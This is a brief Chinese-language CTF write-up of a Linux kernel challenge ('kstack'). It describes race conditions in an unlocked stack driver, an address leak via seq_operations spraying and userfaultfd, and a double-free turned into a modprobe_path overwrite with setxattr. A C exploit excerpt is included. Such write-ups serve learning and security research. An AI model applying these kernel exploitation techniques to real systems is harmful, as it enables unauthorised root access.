# kstack
## IDA

实现了一个简单的栈，PUSH可以压入一个元素，POP可以弹出一个元素，元素之间通过链表相互连接。问题在于所有操作都没有加锁，因此存在竞争。

## 泄漏

读后写导致信息泄漏，通过`spray seq_operation → PUSH → pagefaultfd → POP`调用链来泄漏地址。

## Double-free

两个POP操作之间的竞争会导致double-free，之后通过setxattr+userfaultfd的方式，将object的freelist设为modprobe_path-8的位置，然后通过PUSH来修改modprobe_path，之后触发错误文件类型获取flag.

```c
/*=================================MODPROBE=====================================*/
    ioctl(fd, PUSH, "aaaa");
    perror("push0");
    RUN_JOB(ioctl, fd, POP, handle_page+0x1000); //hangup
    ioctl(fd, POP, rbuf);//free
    perror("free");
    release_fault_page();//double free

    //struct tsk fake_node = {.freelist=modprobe_path-8, .test=modprobe_path-8, .next=modprobe_path-8};
    size_t * ptr = handle_page+0x2000-8;
    *ptr = modprobe_path - 8;
    RUN_JOB(setxattr_job, ptr, 0x20);

    int ret = ioctl(fd1, PUSH, "bbbb");
    printf("ret=%d\n", ret);
    ioctl(fd1, PUSH, "/tmp/1\x00");
```
